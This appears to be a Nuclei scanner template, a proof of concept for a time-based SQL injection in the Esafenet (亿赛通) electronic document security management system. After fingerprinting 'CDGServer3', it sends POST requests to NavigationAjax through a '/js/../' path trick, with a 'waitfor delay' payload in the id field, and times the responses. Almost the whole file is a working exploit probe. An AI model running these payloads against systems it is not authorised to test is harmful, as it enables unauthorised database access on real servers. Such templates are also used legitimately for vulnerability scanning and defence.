id: poc-yaml-yisaitong-esafenet-navigationajax-sqli
info:
  name: 亿赛通电子文档安全管理系统 NavigationAjax SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 亿赛通

flow: |
  http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "CDGServer3"

  - raw:
      - |
        POST /CDGServer3/js/../NavigationAjax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        command=nav&id=-999'waitfor delay '0:0:5'--+&name=&openId=
      - |
        POST /CDGServer3/js/../NavigationAjax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        command=nav&id=-999'waitfor delay '0:0:8'--+&name=&openId=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
